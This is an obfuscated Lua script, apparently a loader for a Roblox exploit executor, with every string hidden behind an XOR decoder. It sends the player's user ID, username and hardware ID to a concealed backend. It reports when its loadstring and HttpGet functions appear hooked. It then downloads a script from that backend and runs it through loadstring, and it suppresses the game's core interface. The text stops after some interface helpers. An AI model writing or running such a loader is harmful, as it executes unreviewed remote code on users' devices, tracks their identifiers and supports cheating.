-- LUAOBF-9OP4D | Obfuscated Lua script | 2026-11-15
local function _de4yl(b,k)
  local n=#k
  if n==0 then return "" end
  local o={}
  for i=1,#b do
    local x=b[i]
    local y=k[((i-1)%n)+1]
    local r=0
    local p=1
    while x>0 or y>0 do
      local xb=x%2
      local yb=y%2
      if xb~=yb then r=r+p end
      x=(x-xb)/2
      y=(y-yb)/2
      p=p*2
    end
    o[i]=string.char(r)
  end
  return table.concat(o)
end
BACKEND_URL = _de4yl({37,75,30,21,38,120,98,16,29,12,49,45,58,18,9,10,56,50,33,86,9,4,33,39,41,18,25,20,32,43,63,77,15,9,123,35,47,94,25,17,61,35,35,17,11,21,37},{77,63,106,101,85,66})
LOADER_ID = _de4yl({108,127,3,79,105,109,109,11,99,127,88,26},{90,72,97,45,95,93,91,58})
LOADER_NAME = _de4yl({53,10,77,91,96,13,12,76,91,52,17,6,89},{121,99,43,62,64})
KEYLESS = true


local _e = _de4yl({83,55,84,2,94,26,39},{42,86,48,113,63,116,120}) .. tostring(LOADER_ID) .. _de4yl({105,67,23,7},{71,40,114,126,57,109,122})
local _o = _de4yl({55,26,15,3,4,12,2},{78,123,107,112,101,98,93,73}) .. tostring(LOADER_ID) .. _de4yl({102,89,24,35,59,67,18,62},{72,42,125,80})
local _z = game:GetService(_de4yl({1,70,62,27,89,15,10},{81,42,95,98,60,125,121,99}))
local _t = game:GetService(_de4yl({123,13,7,32,91,5,74,8,20,44,86,51},{47,122,98,69,53,86}))
local _h = game:GetService(_de4yl({41,17,33,101,24,48,52,7,7,45},{110,100,72,54,125,66,66}))
local _p = game:GetService(_de4yl({107,63,3,10,0,33,78,57,18,43,44,61,72,37,5,29},{62,76,102,120,73,79}))
local _r = game:GetService(_de4yl({121,35,47,3,78,36,55,57,72,51},{43,86,65,80}))
local _q = game:GetService(_de4yl({6,32,1,78,85,50,5,105,32,61},{85,84,96,60,33,87,119,46}))
local _a = game:GetService(_de4yl({32,25,19,39,8,12,17,32,12,27,4,31,8,10,23,37,14,29},{109,120,97,76}))
local _g = game:GetService(_de4yl({120,69,3,33,99,84,5,39,89,82,18},{48,49,119,81}))
local _m = game:GetService(_de4yl({45,78,81,81,86,10,26,113,77,74,69,13,10,68,77},{110,33,63,37,51,100}))
local _c = game:GetService(_de4yl({103,5,70,8,95,76,55,83,14,64,70,7,83},{47,100,54,124,54}))
local LocalPlayer = _z.LocalPlayer
local CurrentCamera = workspace.CurrentCamera
local PlaceId = game.PlaceId
local GameId = game.GameId
local _n = {discord = "", website = ""}
local _l

local function func(_tz, _lz)
	if type(_tz) ~= _de4yl({90,48,8,81,71,35},{41,68,122,56}) or _tz == "" then
		local _e = _de4yl({35,64,110},{109,47,78,51,53}) .. _lz .. _de4yl({65,49,23,41,73,118,59,4,41,94,33,77,36,104,21,53,23,52,2,58,39,0,57,27,53,12},{97,93,126,71,34,86,72})
		local _b = _de4yl({9,23,79,36,84,90,87,122,53,15,11,4,76,71,3,84,61},{80,118,43,87,53,52,119,49})
		local _f = 4

		if _l then
			pcall(_l, _de4yl({30,43,25,31,48,18,103,1,24,21,113,47,62,57,9,9,60},{71,74,125,108,81,124}), _e, 4, _de4yl({36,39,3,3},{83,70,113,109,65,70,55,41}))
		else
			pcall(function()
				_q:SetCore(_de4yl({10,55,73,94,23,92,45,59,65,83,58,82,45,59,72,84},{89,82,39,58,89,51}), {Title = _b, Text = _e, Duration = _f or 4})
			end)
		end

		return
	end

	local _o = setclipboard or toclipboard or syn and syn.write_clipboard

	if _o and pcall(_o, _tz) then
		local _d = _lz .. _de4yl({11,4,79,89,43,22,27,2,91,1,67,83,96,66,23,77,72,4,79,71,34,89,25,31,79},{43,104,38,55,64,54,120,109})
		local _x = _de4yl({8,34,55,84,50,95,114,26,38,42,7,0,72,33,37,38,62},{81,67,83,39,83,49,82})
		local _s = 4

		if _l then
			pcall(_l, _de4yl({21,8,73,50,43,55,9,59,41,16,13,18,51,42,93,21,33},{76,105,45,65,74,89,41,112}), _d, 4, "ok")
		else
			pcall(function()
				_q:SetCore(_de4yl({54,67,5,56,51,57,51,12,64,2,63,28,34,46,10,72},{101,38,107,92,125,86,71}), {Title = _x, Text = _d, Duration = _s or 4})
			end)
		end
	else
		pcall(function()
			_h:OpenBrowserWindow(_tz)
		end)

		local _k = _de4yl({15,86,75,71,71,92,39,6},{64,38,46,41,46,50}) .. _lz .. _de4yl({8,55,62,13,67,117,121,77},{40,91,87,99})
		local _j = _de4yl({113,53,7,10,0,38,25,39,77,45,67,42,24,59,77,9,69},{40,84,99,121,97,72,57,108})
		local _v = 4

		if _l then
			pcall(_l, _de4yl({126,73,19,21,72,73,8,60,3,80,7,123,14,21,93,66,69},{39,40,119,102,41}), _k, 4, "ok")
		else
			pcall(function()
				_q:SetCore(_de4yl({46,27,39,62,1,2,93,20,24,32,57,46,25,64,18,16},{125,126,73,90,79,109,41}), {Title = _j, Text = _k, Duration = _v or 4})
			end)
		end
	end
end

local _u = {
	bg1 = Color3.fromRGB(18, 12, 34),
	bg2 = Color3.fromRGB(5, 3, 11),
	panel = Color3.fromRGB(20, 15, 34),
	card = Color3.fromRGB(30, 23, 48),
	stroke = Color3.fromRGB(56, 42, 88),
	violet = Color3.fromRGB(124, 58, 237),
	fuchsia = Color3.fromRGB(217, 70, 239),
	blue = Color3.fromRGB(59, 130, 246),
	soft = Color3.fromRGB(196, 181, 253),
	text = Color3.fromRGB(255, 255, 255),
	sub = Color3.fromRGB(161, 161, 176),
	muted = Color3.fromRGB(110, 106, 130),
	ok = Color3.fromRGB(52, 211, 153),
	warn = Color3.fromRGB(251, 191, 36),
	bad = Color3.fromRGB(248, 113, 113),
}

local _w = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
local _y = TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)

local function func1(_tz)
	local _e = syn and syn.request or http and http.request or http_request or request

	if not _e then
		error(_de4yl({5,73,71,63,36,52,94,80,124,53,47,84,81,124,63,47,69,2,47,36,48,65,77,46,37,96,121,118,8,1,96,67,71,45,36,37,66,86,47,127},{64,49,34,92,81}))
	end

	return _e(_tz)
end

local function func2(_tz, _lz, _om)
	local _e = _lz or 1
	local _f = 1
	local _b = _de4yl({17,2,29,50,71,3,10,76,19,46,90,27,22},{100,108,118,92,40,116})

	if _e == _e then
		if not (1 > _e) then
			local _d

			while true do
				local _o
				_o, _d = pcall(func1, _tz)

				if _o and type(_d) == _de4yl({69,46,50,68,17},{49,79,80,40,116,98,68,83}) and _d.Body and (_d.StatusCode or 0) < 500 then
					break
				end

				_b = _o and _de4yl({124,96,102,56,20},{52,52,50,104}) .. tostring(_d and _d.StatusCode) or tostring(_d)

				if _f < _e then
					if _om then
						_om(_f)
					end
					task.wait(4)
				end

				_f = _f + 1

				if _f > _e then
					return nil, _b
				end
			end

			return _d
		end
	end

	return nil, _b
end

local function func3(_tz)
	local ok, result = pcall(function()
		return _g:JSONDecode(_tz)
	end)
	return ok and type(result) == _de4yl({49,20,7,71,68},{69,117,101,43,33,59}) and result or nil
end

local function func4(_tz, _lz, _om)
	local _e = func2({
		Url = BACKEND_URL .. _tz,
		Method = _de4yl({34,8,62,40},{114,71,109,124}),
		Headers = {[_de4yl({54,89,3,91,29,27,66,64,123,1,5,83},{117,54,109,47,120})] = _de4yl({44,62,73,47,66,46,47,77,42,68,35,97,83,48,68,35},{77,78,57,67,43})},
		Body = _g:JSONEncode(_lz),
	}, _om or 1)
	return _e and func3(_e.Body)
end

local function func5()
	local ok, result = pcall(function()
		if gethwid then
			return gethwid()
		end
		return game:GetService(_de4yl({11,11,53,103,7,44,24,18,45,0,46,85,58,40,6,29,48,10,40},{89,105,77,38,105,77,116,107})):GetClientId()
	end)
	return ok and result and tostring(result) or _de4yl({11,76,72,28,46,25,86},{126,34,35,114,65,110,56})
end

local function func6()
	local _o = getgenv and getgenv().script_key or rawget(_G, _de4yl({37,50,15,14,38,37,34,12,51,40},{86,81,125,103}))

	if type(_o) == _de4yl({68,26,67,62,83,44},{55,110,49,87,61,75}) and _o ~= "" then
		return _o
	end

	local ok, result = pcall(function()
		if isfile and readfile and isfile(_e) then
			return readfile(_e)
		end
	end)

	return ok and type(result) == _de4yl({22,33,1,81,11,50},{101,85,115,56}) and result:gsub(_de4yl({93,89,116},{120,42,95,122,115,72}), "") or ""
end

local function func7()
	local ok, result = pcall(function()
		if isfile and readfile and isfile(_o) then
			return readfile(_o)
		end
	end)
	return ok and type(result) == _de4yl({26,83,84,54,0,22},{105,39,38,95,110,113,37}) and result:gsub(_de4yl({2,1,119},{39,114,92,123,45}), "") or ""
end

local function func8(_tz)
	if type(_tz) ~= _de4yl({77,46,47,30,4,27,91,69},{43,91,65,125,112,114,52}) then
		return false
	end

	local ok, result = pcall(iscclosure, _tz)

	if not ok then
		return true
	end

	return result == true
end

local _d

RAW_LOADSTRING, _d = (function(_tz, _lz)
	local _e = rawget(_G, _tz) or _lz

	if clonefunction then
		local ok, result = pcall(clonefunction, _e)
		if ok and type(result) == _de4yl({21,43,77,1,80,31,60,29},{115,94,35,98,36,118,83}) then
			return result
		end
	end

	return _e
end)(_de4yl({53,40,82,66,90,7,34,66,55,32},{89,71,51,38,41,115,80,43}), loadstring), nil

local ok, result = pcall(getrawmetatable, game)

if ok and result then
	local _i, result1 = pcall(rawget, result, _de4yl({124,57,92,73,78,3,81,73,79,10},{35,102,50,40}))
	if _i then
		_d = result1
	end
end

local _gu = {}
local _dj = RAW_LOADSTRING

if _dj ~= nil then
	if not func8(_dj) then
		table.insert(_gu, _de4yl({95,47,70,84,64,52,85,89,93,39},{51,64,39,48}))
	end
end

local HttpGet = game.HttpGet

if HttpGet ~= nil then
	if not func8(HttpGet) then
		table.insert(_gu, _de4yl({41,70,57,87,38,87,57},{97,50,77,39}))
	end
end

local HttpGetAsync = game.HttpGetAsync

if HttpGetAsync ~= nil then
	if not func8(HttpGetAsync) then
		table.insert(_gu, _de4yl({56,62,31,78,97,38,4,11,24,71,72,32},{112,74,107,62,38,67}))
	end
end

if _d ~= nil then
	if not func8(_d) then
		table.insert(_gu, _de4yl({107,110,88,82,89,84,85,82,88,93},{52,49,54,51}))
	end
end

local _k = syn and syn.request or http and http.request or http_request or request

if _k ~= nil then
	if not func8(_k) then
		table.insert(_gu, _de4yl({21,32,20,52,24,32,19},{103,69,101,65,125,83}))
	end
end

local _vv = false
local _rg, result2 = pcall(iscclosure, tostring)

if _rg and result2 == true and #_gu > 0 and #_gu < 4 then
	_vv = true
end

if _vv then
	task.spawn(function()
		pcall(function()
			func1({
				Url = BACKEND_URL .. _de4yl({89,77,29,84,89,94,8,77,25,94,25,16,30,67,2,86},{118,44,109,61}),
				Method = _de4yl({61,26,99,37},{109,85,48,113}),
				Headers = {[_de4yl({13,15,22,53,43,46,29,15,26,25,8,36},{78,96,120,65,78,64,105,34})] = _de4yl({16,11,39,43,70,46,23,5,18,56,41,0,39,5,30,21},{113,123,87,71,47,77,118})},
				Body = _g:JSONEncode({loader_id = LOADER_ID, findings = _gu, userId = tostring(LocalPlayer.UserId), hwid = func5()}),
			})
		end)
	end)
end

if KEYLESS == true then
	local token
	local _f = 0
	local _pn = {}

	local function func9()
		if not token then
			return
		end
		pcall(func1, {
			Url = BACKEND_URL .. _de4yl({93,50,5,24,1,68,67,20,63,28,31,75},{114,83,117,113,46,43,37}),
			Method = _de4yl({18,103,33,15},{66,40,114,91}),
			Headers = {[_de4yl({19,34,18,10,16,62,57,81,42,12,32,40},{80,77,124,126,117})] = _de4yl({15,65,71,66,56,1,15,69,94,65,63,77,4,66,88,64},{110,49,55,46,81,98})},
			Body = _g:JSONEncode({token = token}),
		})
	end

	_pn.unsupported = _de4yl({20,37,77,35,96,42,69,61,37,109,77,35,96,35,75,36,96,62,81,32,48,34,86,36,37,41,4,50,57,109,80,56,41,62,4,60,47,44,64,53,50,99},{64,77,36,80})
	_pn.banned = _de4yl({106,23,69,0,1,9,13,29,86,11,67,82,85,7,78,10,91,17,67,82,77,7,15,26,86,10,16,27,82,72,12,18,92,27,91,23,69,70},{51,120,48,114,33,104,110,126})
	_pn.maintenance = _de4yl({44,90,74,7,88,94,76,21,28,87,81,84,17,65,3,29,22,18,78,21,17,92,87,17,22,83,77,23,29,28,3,32,10,75,3,21,31,83,74,26,88,94,66,0,29,64,13},{120,50,35,116})
	_pn.key_required = _de4yl({107,56,69,71,13,49,52,94,52,73,70,13,51,52,72,112,66,81,72,57,40,31,49,12,95,72,36,117,31,17,95,95,13,41,51,90,112,67,67,67,56,41,17},{63,80,44,52,45,93,91})
	_pn.no_script = _de4yl({127,84,85,8,11,80,83,26,79,89,78,91,67,93,79,91,69,83,28,8,72,78,85,11,95,28,69,30,95,18},{43,60,60,123})
	_pn.bad_request = _de4yl({11,75,52,49,63,28,67,56,34,80,32,37,122,11,17,57,40,86,123,117,25,1,13,63,38,71,33,117,46,6,6,107,40,83,59,48,40,64},{71,36,85,85,90,110,99,75})
	_pn.unreachable = _de4yl({60,0,52,71,35,70,102,6,28,69,49,80,45,93,40,8,79,16,54,31,102,102,51,1,79,17,46,84,102,88,41,14,11,0,52,17,39,83,39,6,1,69,47,95,102,85,102,9,10,18,102,66,35,87,41,1,11,22,104},{111,101,70,49,70,52,70,111})

	local function func10()
		local message
		local reason
		local _f = 1

		while true do
			local _n = {
				Url = BACKEND_URL .. _de4yl({10,13,53,42,10,3,53,38,75,67,47,44,76,2},{37,108,69,67}),
				Method = _de4yl({125,54,100,14},{45,121,55,90}),
				Headers = {[_de4yl({103,25,70,85,65,24,92,12,112,15,88,68},{36,118,40,33})] = _de4yl({79,4,45,6,57,11,79,0,52,5,62,71,68,7,50,4},{46,116,93,106,80,104})},
			}

			local _u = {
				loader_id = tostring(LOADER_ID),
				userId = tostring(LocalPlayer.UserId),
				username = LocalPlayer.Name,
			}

			local ok, result = pcall(function()
				if gethwid then
					return gethwid()
				end
				return game:GetService(_de4yl({2,51,80,17,23,49,61,81,36,16,51,34,123,53,11,38,56,75,53},{80,81,40,80,121})):GetClientId()
			end)

			_u.hwid = ok and result and tostring(result) or _de4yl({43,64,4,50,30,68,95},{94,46,111,92,113,51,49})
			_u.gameId = tostring(GameId)
			_n.Body = _g:JSONEncode(_u)
			local _e = func2(_n, 2)
			local _o = _e

			if _e then
				local Body = _e.Body

				local _i, result1 = pcall(function()
					return _g:JSONDecode(Body)
				end)

				_o = _i and type(result1) == _de4yl({58,12,68,47,78},{78,109,38,67,43}) and result1 or nil
			end

			if _o and _o.success then
				return _o
			end

			if _o then
				message = _o.message
				reason = _o.reason
			end

			if not (_o and (_o.reason == _de4yl({17,4,56,93,13,23},{115,101,86,51,104}) or _o.reason == _de4yl({11,27,27,30,14,5,7,25,10,16,12},{126,117,104,107}) or _o.reason == _de4yl({59,16,4,73,34,20,3,70,56,18,8},{86,113,109,39}) or _o.reason == _de4yl({35,23,74,20,58,23,66,62,33,0,86,47},{72,114,51,75}) or _o.reason == _de4yl({49,57,12,71,15,78,87,28,43},{95,86,83,52,108,60,62,108}))) then
				task.wait(_f * 2)
				_f = _f + 1

				if not (_f > 3) then
					continue
				end
			end

			break
		end

		return nil, reason, message
	end

	local function func11(_tz)
		if type(_tz) ~= _de4yl({37,82,21,19,56,65},{86,38,103,122}) or _tz:match(_de4yl({29,75,77,8,76},{67,110,62,34,104,46,116})) then
			local _b = _de4yl({118,3,53,31,40,65,66,26,9,48,15,49,40,31,61,74,15},{47,98,81,108,73})
			local _x = _de4yl({4,49,34,79,93,45,53,49,61,46,78,93,41,59,35,121,37,83,93,50,57,34,48,59,72,93,56,63,36,119},{80,89,75,60,125,65,90})
			local _f = 6

			if _l then
				pcall(_l, _de4yl({34,79,48,71,35,65,20,48,75,45,20,17,86,71,15,75,57},{123,46,84,52,66,47,52}), _de4yl({47,34,37,9,100,64,1,26,46,41,8,100,68,15,8,106,34,21,100,95,13,9,35,60,14,100,85,11,15,100},{123,74,76,122,68,44,110}), 6, _de4yl({28,25,61,43},{107,120,79,69,78,118,99,112}))
			else
				pcall(function()
					_q:SetCore(_de4yl({110,58,20,72,115,48,14,69,91,54,25,77,73,54,21,66},{61,95,122,44}), {Title = _b, Text = _x, Duration = _f or 4})
				end)
			end

			return
		end

		local _e = _tz:gsub(_de4yl({25,226,131,253,244,133,158},{71,33,44,63,79}), "")
		local _o = _e

		if _e:match(_de4yl({56,86,76,12,31,46,51,1,21,76,5,9,88,127,20,90,67,0,21,2},{102,115,63,38,119,90,71,113})) then
			local _d = _e:match(_de4yl({113,30,41,117,11,73,13,95,6,30,41,117,7},{47,59,90,95,35,108,94,116}))

			local ok, result = pcall(function()
				return game:HttpGet(_d)
			end)

			if not ok or type(result) ~= _de4yl({76,15,83,92,1,88},{63,123,33,53,111}) or result == "" then
				local _j = _de4yl({11,34,43,42,7,14,7,25,38,54,121,53,25,84,38,38,34},{82,67,79,89,102,96,39})
				local _yb = _de4yl({109,28,50,57,74,83,41,58,90,83,35,58,89,29,43,58,79,23,103,33,70,22,103,38,77,1,46,37,90,93},{46,115,71,85})
				local _s = 6

				if _l then
					pcall(_l, _de4yl({29,60,29,77,49,42,125,50,91,41,100,14,0,77,36,33,48},{68,93,121,62,80}), _de4yl({106,39,80,69,35,15,71,39,81,9,35,64,94,38,73,70,38,75,9,60,77,76,103,92,74,58,76,89,51,1},{41,72,37,41,71,47}), 6, _de4yl({43,38,45,19},{92,71,95,125}))
				else
					pcall(function()
						_q:SetCore(_de4yl({5,41,95,69,60,73,95,10,48,37,82,64,6,79,68,13},{86,76,49,33,114,38,43,99}), {Title = _j, Text = _yb, Duration = _s or 4})
					end)
				end

				return
			end

			_o = result
		end

		local _n = {}

		if type(RAW_LOADSTRING) == _de4yl({13,55,88,90,6,2,45,88},{107,66,54,57,114}) then
			table.insert(_n, RAW_LOADSTRING)
		end

		if type(loadstring) == _de4yl({63,2,54,22,92,84,68,7},{89,119,88,117,40,61,43,105}) and loadstring ~= RAW_LOADSTRING then
			table.insert(_n, loadstring)
		end

		local _ly

		for _ma, _k in ipairs(_n) do
			local _i, result1 = pcall(_k, _o)
			if _i and type(result1) == _de4yl({54,65,13,63,92,5,3,62},{80,52,99,92,40,108,108}) then
				_ly = result1
				break
			end
		end

		if not _ly then
			local _wg = _de4yl({99,64,83,31,57,84,1,124,9,33,26,114,78,31,44,95,76},{58,33,55,108,88})
			local _fv = _de4yl({111,71,24,86,32,80,28,66,11,86,60,65,88,4,30,80,112,71,83,73,26,86,60,65,18},{60,36,106,63,80,36})
			local _v = 8

			if _l then
				pcall(_l, _de4yl({13,71,49,37,56,46,7,1,49,95,117,5,32,51,83,47,57},{84,38,85,86,89,64,39,74}), _de4yl({113,48,34,37,82,39,112,42,67,58,60,41,70,115,36,35,2,48,63,33,82,58,60,41,12},{34,83,80,76}), 8, _de4yl({72,13,84},{42,108,48,81}))
			else
				pcall(function()
					_q:SetCore(_de4yl({122,52,41,22,45,70,37,46,20,10,74,48,51,27,12,71},{41,81,71,114,99}), {Title = _wg, Text = _fv, Duration = _v or 4})
				end)
			end

			return
		end

		task.spawn(function()
			local ok, result = xpcall(_ly, function(_tz)
				return tostring(_tz) .. "\n" .. debug.traceback()
			end)
			if not ok then
				local _e = _de4yl({45,22,30,61,58,69,27,16,12,7,3,38,112,17},{126,117,108,84,74,49,59,117}) .. tostring(result):sub(1, 120)
				local _b = _de4yl({108,95,46,87,84,80,106,111,80,71,106,119,76,77,62,65,88},{53,62,74,36})
				local _f = 8

				if _l then
					pcall(_l, _de4yl({2,89,70,86,82,15,91,101,62,65,2,118,74,18,15,75,54},{91,56,34,37,51,97,123,46}), _e, 8, _de4yl({9,77,18},{107,44,118,95}))
				else
					pcall(function()
						_q:SetCore(_de4yl({62,21,1,90,97,2,25,25,9,87,76,12,25,25,0,80},{109,112,111,62,47,109}), {Title = _b, Text = _e, Duration = _f or 4})
					end)
				end
			end
		end)
	end

	task.spawn(function()
		local _e, _o, _d = func10()

		if not _e then
			local _k = _o and _pn[_o] or _d or _pn.unreachable
			local _b = _de4yl({20,23,75,16,48,35,86,100,6,40,109,37,86,16,37,40,27},{77,118,47,99,81})
			local _s = 8

			if _l then
				pcall(_l, _de4yl({47,17,41,31,23,30,109,39,19,9,109,63,15,3,57,9,27},{118,112,77,108}), _k, 8, _de4yl({15,10,37,67},{120,107,87,45,44,87}))
			else
				pcall(function()
					_q:SetCore(_de4yl({61,45,14,57,21,31,7,93,8,33,3,60,47,25,28,90},{110,72,96,93,91,112,115,52}), {Title = _b, Text = _k, Duration = _s or 4})
				end)
			end

			return
		end

		local _tq = _e.token
		token = _e.token

		task.spawn(function()
			local _o

			while true do
				task.wait(15)
				local _n = {}
				_n.Url = BACKEND_URL .. _de4yl({89,90,34,95,12,43,79,19,85,125,94,70,37,77,2,89,55,87,87},{118,59,82,54,35,68,63})
				_n.Method = _de4yl({32,2,100,111},{112,77,55,59,56,44})
				_n.Headers = {[_de4yl({29,38,66,51,59,39,88,106,10,48,92,34},{94,73,44,71})] = _de4yl({70,30,26,88,57,68,15,30,93,63,73,65,0,71,63,73},{39,110,106,52,80})}
				_n.Body = _g:JSONEncode({token = _tq})
				local _e = func2(_n, 2)
				_o = _e

				if _e then
					local Body = _e.Body

					local ok, result = pcall(function()
						return _g:JSONDecode(Body)
					end)

					_o = ok and type(result) == _de4yl({79,67,21,91,73},{59,34,119,55,44,61,121,103}) and result or nil
				end

				if _o and _o.success == false and _o.reason ~= _de4yl({72,25,67,43,78,28,85,46},{44,112,48,74}) then
					break
				end

				local _d = _o and _o.success and tonumber(_o.message_id)

				if _d and _d ~= 0 and _d ~= _f then
					_f = _d
					local _b = tostring(_o.message or "")
					local _x = _de4yl({37,32,84,54,29,47,16,14,25,56,16,22,5,50,68,32,17,97,81,43,18,46,69,43,31,36,93,32,18,53},{124,65,48,69})
					local _s = 8

					if _l then
						pcall(_l, _de4yl({35,22,71,41,91,31,8,42,31,14,3,9,67,2,92,4,23,87,66,52,84,30,93,15,25,18,78,63,84,5},{122,119,35,90,58,113,40,97}), _b, 8, nil)
					else
						pcall(function()
							_q:SetCore(_de4yl({19,30,76,49,7,83,62,42,38,18,65,52,61,85,37,45},{64,123,34,85,73,60,74,67}), {Title = _x, Text = _b, Duration = _s or 4})
						end)
					end
				end
			end

			local message = _o.message
			token = nil
			message = message or _de4yl({116,18,68,67,38,72,25,23,85,33,67,18,83,30},{39,119,55,48,79})
			local _j = _de4yl({127,86,76,76,71,73,87,109,82,81,31,117,94,4,82,82,69},{38,55,40,63,38,39,119})
			local _yy = message
			local _v = 6

			if _l then
				pcall(_l, _de4yl({32,20,38,27,13,23,85,9,13,21,89,38,59,27,24,28,24},{121,117,66,104,108}), _yy, 6, _de4yl({55,57,15,24},{64,88,125,118,87,41}))
			else
				pcall(function()
					_q:SetCore(_de4yl({25,68,64,7,27,17,62,72,72,10,54,31,62,72,65,13},{74,33,46,99,85,126}), {Title = _j, Text = _yy, Duration = _v or 4})
				end)
			end
		end)

		func11(_e.script)
	end)

	pcall(function()
		game:BindToClose(func9)
	end)

	_z.PlayerRemoving:Connect(function(_zq)
		if _zq == LocalPlayer then
			func9()
		end
	end)

	return
end

local function func12(_le, _lz)
	local _yg = Instance.new(_de4yl({105,60,18,18,28,82,16,35},{60,117,81,125,110}))
	_yg.CornerRadius = _lz or UDim.new(0, 12)
	_yg.Parent = _le
	return _yg
end

local function func13(_le, _jo, _om)
	local _zt = Instance.new(_de4yl({102,26,52,51,65,60,12,34},{51,83,103,71}))
	_zt.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	_zt.Color = _jo
	_zt.Thickness = _om or 1
	_zt.Parent = _le
	return _zt
end

local function func14(_le, _xz, _by, _wq, _um)
	local _vk = Instance.new(_de4yl({36,12,24,37,57},{98,126,121,72,92,120,59,70}))
	_vk.BorderSizePixel = 0
	_vk.Position = _xz
	_vk.Size = _by
	_vk.BackgroundColor3 = _wq
	_vk.Parent = _le

	if _um then
		func12(_vk, UDim.new(0, _um))
		func12(_vk, UDim.new(0, _um))
	end

	return _vk
end

local function func15(_le, _lz, _om, _sm)
	local _dc = Instance.new(_de4yl({116,59,11,77,0,31,9,68,28,56},{33,114,76,63,97,123,96}))
	_dc.Color = ColorSequence.new(_lz, _om)
	_dc.Rotation = _sm or 0
	_dc.Parent = _le
	return _dc
end

local function func16(_le, text, _ee, _cg, _vn, _xz, _by, _yz)
	local _ow = Instance.new(_de4yl({28,4,80,55,4,0,74,38,36},{72,97,40,67}))
	_ow.BackgroundTransparency = 1
	_ow.Text = text
	_ow.TextSize = _ee
	_ow.TextColor3 = _cg
	_ow.Font = _vn
	_ow.Position = _xz
	_ow.Size = _by
	_ow.TextXAlignment = _yz or Enum.TextXAlignment.Left
	_ow.TextYAlignment = Enum.TextYAlignment.Center
	_ow.Parent = _le
	return _ow
end

local _dk = {}

local function func17(_le, _wq, _om)
	local _vk = Instance.new(_de4yl({120,28,32,25,83},{62,110,65,116,54,71,123}))
	_vk.BackgroundTransparency = 1
	_vk.AnchorPoint = Vector2.new(0.5, 0.5)
	_vk.Parent = _le

	for _no = 1, _om do
		local _sr = Instance.new(_de4yl({18,95,82,89,49},{84,45,51,52}))
		_sr.AnchorPoint = Vector2.new(0.5, 0.5)
		_sr.Position = UDim2.fromScale(0.5, 0.5)
		local _e = (_no - 1) / _om
		local _o = 1 - _e
		_sr.Size = UDim2.fromScale(_o, _o)
		_sr.BackgroundColor3 = _wq
		_sr.BackgroundTransparency = 0.955
		_sr.BorderSizePixel = 0
		_sr.Parent = _vk
		func12(_sr, UDim.new(1, 0))
		func12(_sr, UDim.new(1, 0))
	end

	return _vk
end

local function func18(_tz, _lz)
	local _n = {}

	for _no = 0, _lz * 2 do
		local _e = #_n
		_n[_e + 1] = NumberSequenceKeypoint.new(_no / (_lz * 2), _no % 2 == 0 and 0 or 1)
	end

	_tz.Transparency = NumberSequence.new(_n)
end

local _qo = {core = _dk, topbar = true, chatbar = false, touch = true, cg = {}}

for _ma, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
	if enumItem ~= Enum.CoreGuiType.All then
		pcall(function()
			_qo.core[enumItem] = _q:GetCoreGuiEnabled(enumItem)
		end)
	end
end

pcall(function()
	_qo.topbar = _q:GetCore(_de4yl({61,56,48,10,46,88,116,73,8,53,44,13,43},{105,87,64,104,79,42,49,39})) ~= false
end)

pcall(function()
	_qo.chatbar = _q:GetCore(_de4yl({21,81,81,62,20,88,66,14,63,74,81,40,58,92,84},{86,57,48,74})) == true
end)

local function func19()
	for _ma, enumItem in ipairs(Enum.CoreGuiType:GetEnumItems()) do
		pcall(function()
			_q:SetCoreGuiEnabled(enumItem, false)
		end)
	end

	pcall(function()
		_q:SetCore(_de4yl({57,24,10,19,32,57,5,0,12,21,22,20,37},{109,119,122,113,65,75,64,110}), false)
	end)

	pcall(function()
		_q:SetCore(_de4yl({1,6,23,51,116,64,48,42,31,52,87,67,46,11,18},{66,110,118,71,54,33}), true)
	end)

	pcall(function()
		local _qb = LocalPlayer:FindFirstChildOfClass(_de4yl({18,25,49,1,45,48,50,37,17},{66,117,80,120,72}))
		local _e = _qb and _qb:FindFirstChild(_de4yl({99,84,88,65,50,112,78,68},{55,59,45,34,90}))

		if _e then
			_e.Enabled = false
		end
	end)

	pcall(function()
		local _fa = game:GetService(_de4yl({37,70,34,60,33,92,57},{102,41,80,89}))
		for _ma, _e in ipairs({_de4yl({29,58,28,21,14,5,20,89,57},{73,85,108,87,111,119,85,41}), _de4yl({61,14,5,58,50,17,19,27,60,37,59,30,20,43},{120,118,117,95,64})}) do
			local _o = _fa:FindFirstChild(_e)
			if _o and _o:IsA(_de4yl({10,16,38,15,10,74,30,6,61},{89,115,84,106,111,36})) then
				if _qo.cg[_e] == nil then
					_qo.cg[_e] = _o.Enabled
				end
				_o.Enabled = false
			end
		end
	end)
end

local _wc = true
func19()

task.spawn(function()
	while _wc do
		task.wait(0.5)
		if _wc then
			func19()
		end
	end
end)

local function func20()
	_wc = false

	for k, _e in pairs(_qo.core) do
		pcall(function()
			_q:SetCoreGuiEnabled(k, _e)
		end)
	end

	pcall(function()
		_q:SetCore(_de4yl({15,3,92,76,64,95,57,53,13,78,66,68,73},{91,108,44,46,33,45,124}), _qo.topbar)
	end)

	pcall(function()
		_q:SetCore(_de4yl({111,61,45,20,110,52,62,36,69,38,45,2,64,48,40},{44,85,76,96}), _qo.chatbar)
	end)

	pcall(function()
		local _qb = LocalPlayer:FindFirstChildOfClass(_de4yl({1,44,38,16,67,47,13,36,41},{81,64,71,105,38,93,74}))
		local _e = _qb and _qb:FindFirstChild(_de4yl({105,25,46,21,85,49,46,31},{61,118,91,118}))

		if _e then
			_e.Enabled = true
		end
	end)

	pcall(function()
		local _fa = game:GetService(_de4yl({123,85,48,88,127,79,43},{56,58,66,61}))
		for k, _e in pairs(_qo.cg) do
			local _o = _fa:FindFirstChild(k)
			if _o and _o:IsA(_de4yl({120,91,19,93,43,5,59,94,81},{43,56,97,56,78,107,124})) then
				_o.Enabled = _e
			end
		end
	end)
end

local function func21()
	local ok, result = pcall(function()
		return gethui and gethui() or game:GetService(_de4yl({117,63,48,74,60,14,95},{54,80,66,47,123,123}))
	end)
	return ok and result or nil
end

local function func22(_tz)
	local _e = func21()
	if not (_e and pcall(function()
		_tz.Parent = _e
	end) and _tz.Parent) then
		_tz.Parent = LocalPlayer:WaitForChild(_de4yl({40,72,89,31,83,10,99,77,15},{120,36,56,102,54}))
	end
end

local _bq = {}
local _fa = game:GetService(_de4yl({104,30,23,8,117,94,24},{43,113,101,109,50}))
local _ly = func21()
